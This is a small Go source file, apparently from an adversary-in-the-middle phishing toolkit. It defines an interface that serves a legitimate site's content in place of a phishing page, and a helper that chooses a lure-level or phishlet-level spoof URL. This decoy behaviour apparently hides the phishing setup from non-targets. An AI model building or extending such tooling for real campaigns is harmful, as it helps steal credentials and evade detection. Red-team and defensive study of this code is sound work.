package request

import (
	"net/http"

	"github.com/travisbale/mirage/internal/aitm"
)

// spoofer renders a legitimate site's content in place of a phishing response.
type spoofer interface {
	ServeHTTP(w http.ResponseWriter, r *http.Request)
	ServeWithTarget(w http.ResponseWriter, r *http.Request, spoofURL string)
}

// contextSpoofURL returns the most specific spoof URL available for the
// request context: lure-level takes precedence over phishlet-level.
// Returns "" if neither is configured.
func contextSpoofURL(ctx *aitm.ProxyContext) string {
	if ctx.Lure != nil && ctx.Lure.SpoofURL != "" {
		return ctx.Lure.SpoofURL
	}
	if ctx.Phishlet != nil && ctx.Phishlet.SpoofURL != "" {
		return ctx.Phishlet.SpoofURL
	}
	return ""
}
